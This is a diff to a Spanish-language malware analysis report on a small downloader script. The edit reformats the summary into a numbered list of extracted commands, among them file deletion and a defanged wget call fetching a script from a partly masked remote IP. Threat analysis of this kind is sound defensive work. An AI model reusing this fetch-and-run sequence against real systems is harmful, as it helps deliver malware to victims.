@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with no line terminators de 257 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 257 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `chmod`
+2. `rm -f .s`
+3. `wget hxxp://91.92.40.XXX/wget.s` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3.md](../../../../../malware-like/oraculo/downloader/4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3.md)
 
 
 ## 🏷️ Clasificación
